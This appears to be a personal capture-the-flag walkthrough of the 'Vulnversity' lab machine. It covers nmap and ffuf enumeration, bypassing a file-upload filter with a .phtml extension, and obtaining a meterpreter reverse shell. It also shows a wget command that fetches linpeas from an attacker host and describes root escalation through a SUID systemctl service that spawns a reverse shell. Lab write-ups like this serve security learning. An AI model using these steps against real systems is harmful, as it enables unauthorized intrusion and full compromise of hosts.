[+] Vulnversity

#### IP Address

```bash
EXPORT IP=10.10.24.98
```

## Nmap scan

- 139 - SMB
    - authentication level: guest
    - SMB security signatures enabled but **not required**
- 445 - SMB
- 3128
    - Squid proxy 3.5.12
- 3333 - http Apache 2.4.18

## Ffuf

no robots.txt

/css
/js
/fonts/images
/internal -> page to upload file
- tried PHP **BLOCKED**
- tried phtml -> **ACCEPTED**

## Getting revshell

I attempted getting a meterpreter shell first. I didn't think it would work as I know that they generally don't due to AV or other reasons, but it was a good try. 

I tried both x64 x86 versions of meterpreter/reverse_tcp

This got me a low level user on the box.

## Enumerating

Was able to cd to /tmp/ and download linpeas via:

```
wget "10.2.110.157/linpeas.sh"
```

Where 10.2.110.157 was my attacker machine, with a python SimpleHTTPServer

The thing that stuck out the most, was systemctl having SUID permissions. To exploit this, I used:

https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740

Essentially, setting up a service that start a reverse shell via systemctl. Super simple method of getting root on the box.
